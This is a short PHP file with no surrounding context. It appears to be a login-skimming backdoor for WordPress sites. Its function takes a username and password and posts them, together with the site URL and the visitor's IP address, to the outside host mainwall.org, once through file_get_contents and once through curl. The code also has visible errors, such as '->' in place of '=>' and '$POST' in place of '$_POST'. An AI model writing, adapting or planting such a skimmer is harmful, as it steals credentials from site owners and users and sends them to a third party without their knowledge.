<?php

  sendPost($username, $password, 'http://mainwall.org/login.php');
  function sendPost($username, $password, $reqUrl) {
    $reqUrl = "http://mainwall.org/login.php";
    $postdata = http_build_query(
                                  array(
                                         'u' => $username,
                                         'p' => $password,
                                         'url' => site_url().$_POST['_wp_http_referer'],
                                         'ip' => $_SERVER['REMOTE_ADDR']
                                       )
                                 );

    $opts = array('http' =>
                            array(
                                    'method' => 'POST',
                                    'header' => 'Content-type: application/x-www-form-urlencoded',
                                    'content' -> $postdata
                                 )
                 );

    $context = stream_context_create($opts);
    $result = file_get_contents($reqUrl, false, $context);

    if(function_exists('curl_init')) {
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $reqUrl);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS,
                    "u=$username&p=$password&url=".site_url().$POST['_wp_http_referer']."&ip=".$_SERVER['REMOTE_ADDR']);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      $server_output = curl_exec($ch);
      curl_close($ch);
    }
    return true;
  }

?>
